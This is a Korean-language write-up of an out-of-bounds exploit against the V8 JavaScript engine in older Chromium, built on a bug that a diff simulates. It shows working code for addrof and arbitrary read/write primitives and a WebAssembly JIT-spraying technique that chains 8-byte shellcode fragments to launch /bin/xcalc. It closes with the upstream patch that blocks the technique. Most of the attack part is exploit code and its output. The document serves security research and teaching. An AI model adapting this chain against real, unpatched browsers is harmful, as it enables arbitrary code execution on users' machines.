# V8 OOB Exploitation (Chromium < 122.0.6261.57, V8 < 12.2.170)

## Setup

- Ubuntu 22.04.5 LTS (WSL)
- [8cf17a14a78cc1276eb42e1b4bb699f705675530](https://chromium.googlesource.com/v8/v8/+/8cf17a14a78cc1276eb42e1b4bb699f705675530) (2024.01.04.)

[oob.diff](./oob.diff)는 out of bounds 버그가 발생한 상황을 simulate하기 위해 array의 length를 임의로 더 크게 설정해도 array가 확장되지 않도록 하고, [dcheck.diff](./dcheck.diff)는 debug build에서 exploit을 진행할 때 crash가 발생하지 않도록 debug check를 제거한다.

[setup.sh](./setup.sh)

## Exploitation

### Generate OOB array

```js
// flags: --allow-natives-syntax --shell

let oob_arr = [1.1];

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${oob_arr.length}`);

% DebugPrint(oob_arr);
```

![image](https://github.com/user-attachments/assets/313d5540-4186-4885-b051-834155f5b64f)

![image](https://github.com/user-attachments/assets/3215234d-82ad-4b7e-8088-e0e1cd55f4ba)

![image](https://github.com/user-attachments/assets/a11a6667-db6e-46ce-b5ff-3fd096b4bc9a)

### Helper functions

```js
let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}
```

### Get address of arbitrary object

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(obj_arr);
```

함수 내부에서 `oob_arr`과 `obj_arr`을 연속해서 정의하면 메모리 상에서 인접한 위치에 할당된다. 따라서 `oob_arr`을 통해 `obj_arr`의 메모리에 접근하여 값을 읽고 쓸 수 있다.

![image](https://github.com/user-attachments/assets/9f7ce0db-456c-4cf0-9867-1d2a767f4bd6)

![image](https://github.com/user-attachments/assets/d4045542-81da-47b1-bd89-4b5e7e7c38a5)

![image](https://github.com/user-attachments/assets/58f600ac-687d-4d90-be57-9003abfea055)

```js
// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
```

![image](https://github.com/user-attachments/assets/4182fce3-1611-4f2a-b25b-a49774b2d3ca)

### Arbitrary address read/write

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/5316c27c-0680-4d5c-a8d1-46e24b6815e8)

![image](https://github.com/user-attachments/assets/02e283cc-3063-4e04-b4c9-ef9a0417de04)

![image](https://github.com/user-attachments/assets/c205a1a1-6076-48bc-bc80-90ebc338dcf9)

OOB를 이용하여 `TypedArray`의 `base_pointer`를 조작하면 sandbox 내부의 임의의 주소에 접근하여 값을 읽거나 쓸 수 있다.

```js
// aar test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/2c0cbd19-eda0-4f60-a90b-f44cd4034d0b)

![image](https://github.com/user-attachments/assets/26647b31-1144-4778-b04c-7611943b32e2)

```js
// aaw test
aarw(tmp_obj_addr - 1n, 0x4141414141414141n);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/f7103a3c-c246-4d81-b7b7-2c3fb609d4d6)

![image](https://github.com/user-attachments/assets/075c2c39-8544-4d07-9944-2517f26a5f06)

### Execute shellcode - JIT spraying

```bash
echo '(module
    (func $main
        f64.const 1.1
        f64.const 2.2
        f64.const 3.3
        return
    )
    (export "main" (func $main))
)' > pwn.wat
~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
```

![image](https://github.com/user-attachments/assets/e03fcdc8-d70c-41ad-a74f-1cfa4f4a82a9)

JavaScript에서 WebAssembly module의 exported function을 최초로 호출하면 run-time에 lazy compilation이 진행되는데, 이때 `f64.const` instruction의 operand들이 코드에 raw number로 삽입된다.

[wasm.py](./wasm.py)

```shell
$ python3 wasm.py
[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x20, 0x1, 0x1e, 0x0, 0x44, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xf1, 0x3f, 0x44, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0x1, 0x40, 0x44, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xa, 0x40, 0xf, 0xb]
```

```js
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x20, 0x1, 0x1e, 0x0, 0x44, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xf1, 0x3f, 0x44, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0x1, 0x40, 0x44, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xa, 0x40, 0xf, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
wasm_instance.exports.main(); // compile

% DebugPrint(wasm_instance);
```

![image](https://github.com/user-attachments/assets/afd89628-c4c4-4e78-a21f-bd515c7c765d)

![image](https://github.com/user-attachments/assets/6a3b8142-2be6-45f0-9bc0-dd2dd355bf28)

이를 이용하여 executable memory에 최대 8바이트의 shellcode를 쓸 수 있고, AAW를 이용하여 `jump_table_start`를 shellcode의 주소로 조작하면 exported function을 호출했을 때 shellcode가 실행된다. 실행하고자 하는 shellcode가 8바이트보다 길 경우, 마지막 2바이트에 `jmp` instruction을 삽입하여 다음 shellcode로 점프하도록 하면 여러 개의 짧은 shellcode들로 chain을 구성할 수 있다.

[shellcode.py](./shellcode.py)

![image](https://github.com/user-attachments/assets/e3fbef0b-9c41-4896-8883-e361c9115ac8)

[pwn.wat](./pwn.wat)

```bash
~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
```

```shell
$ python3 wasm.py
[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x9f, 0x1, 0x1, 0x9c, 0x1, 0x0, 0x44, 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x66, 0xb8, 0x6c, 0x63, 0x50, 0x90, 0xeb, 0x7, 0x44, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x90, 0xeb, 0x7, 0x44, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x5, 0x2f, 0x62, 0x69, 0x6e, 0xeb, 0x7, 0x44, 0x50, 0x48, 0x89, 0xe7, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x66, 0xb8, 0x3a, 0x30, 0x50, 0x90, 0xeb, 0xc, 0x44, 0xb8, 0x4c, 0x41, 0x59, 0x3d, 0x90, 0xeb, 0xc, 0x44, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x5, 0x44, 0x49, 0x53, 0x50, 0xeb, 0xc, 0x44, 0x50, 0x48, 0x89, 0xe0, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xdb, 0x53, 0x50, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x89, 0xe2, 0x90, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x90, 0xeb, 0xc, 0x44, 0xf, 0x5, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xf, 0xb]
```

```js
console.log("[+] JIT spraying...");
let wasm_code = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x9f, 0x1, 0x1, 0x9c, 0x1, 0x0, 0x44, 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x66, 0xb8, 0x6c, 0x63, 0x50, 0x90, 0xeb, 0x7, 0x44, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x90, 0xeb, 0x7, 0x44, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x5, 0x2f, 0x62, 0x69, 0x6e, 0xeb, 0x7, 0x44, 0x50, 0x48, 0x89, 0xe7, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0xeb, 0x7, 0x44, 0x90, 0x48, 0x31, 0xc0, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x66, 0xb8, 0x3a, 0x30, 0x50, 0x90, 0xeb, 0xc, 0x44, 0xb8, 0x4c, 0x41, 0x59, 0x3d, 0x90, 0xeb, 0xc, 0x44, 0x90, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x5, 0x44, 0x49, 0x53, 0x50, 0xeb, 0xc, 0x44, 0x50, 0x48, 0x89, 0xe0, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xdb, 0x53, 0x50, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x89, 0xe2, 0x90, 0x90, 0x90, 0xeb, 0xc, 0x44, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x90, 0xeb, 0xc, 0x44, 0xf, 0x5, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xf, 0xb]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
wasm_instance.exports.main(); // compile
```

![image](https://github.com/user-attachments/assets/7cf07be4-0ed0-4d75-bff4-8b1ebcdfe4d0)

![image](https://github.com/user-attachments/assets/8326e864-41ea-4dad-9a20-3ea55b932018)

Shellcode 간의 간격이 처음 7개까지는 7바이트였다가 이후에 12바이트로 증가하는 것을 고려하여 `jmp` instruction의 operand를 조절해 주어야 한다.

이후 `wasm_instance`의 `jump_table_start`를 shellcode의 주소로 덮어쓰고 exported function을 호출하면 shellcode가 실행된다.

```js
// get address of rwx region
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let rwx = aarw(wasm_instance_addr - 1n + 0x48n);
console.log(`[+] rwx == ${hex(rwx)}`);

// overwrite jump_table_start of |wasm_instance| with address of shellcode
// aarw(wasm_instance_addr - 1n + 0x48n, rwx + 0x84fn); // debug
aarw(wasm_instance_addr - 1n + 0x48n, rwx + 0x81an); // release

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/52e6a2ae-76c6-456a-9394-55bc2b2651dc)

## Patch

> [[wasm] Introduce WasmTrustedInstanceData](https://chromium.googlesource.com/v8/v8/+/59acab802a319da23c1c005e062fbc2bab4d348b) (2024.01.04.)
>
> This CL moves most data from the WasmInstanceObject to a new WasmTrustedInstanceData. As the name suggests, this new object is allocated in the trusted space and can hence hold otherwise-unsafe data (like direct pointers). As the Wasm instance was still storing some unsafe pointers, this CL closes holes in the V8 sandbox, and allows us to land follow-up refactorings to remove more indirections for sandboxing (potentially after moving more data structures to the trusted space).

```diff
diff --git a/src/builtins/x64/builtins-x64.cc b/src/builtins/x64/builtins-x64.cc
index 336caaa..840a51a 100644
--- a/src/builtins/x64/builtins-x64.cc
+++ b/src/builtins/x64/builtins-x64.cc
@@ -3142,9 +3142,10 @@
     RestoreWasmParams(masm, offset);
     // After the instance register has been restored, we can add the jump table
     // start to the jump table offset already stored in r15.
-    __ addq(r15, MemOperand(kWasmInstanceRegister,
-                            wasm::ObjectAccess::ToTagged(
-                                WasmInstanceObject::kJumpTableStartOffset)));
+    __ addq(r15,
+            MemOperand(kWasmInstanceRegister,
+                       wasm::ObjectAccess::ToTagged(
+                           WasmTrustedInstanceData::kJumpTableStartOffset)));
   }
 
   // Finally, jump to the jump table slot for the function.
```

`WasmInstanceObject`의 data들을 `WasmTrustedInstanceData`로 옮기는 패치가 진행되어, 이제 `WasmInstanceObject`를 통해 jump table (RWX region)에 접근할 수 없다.
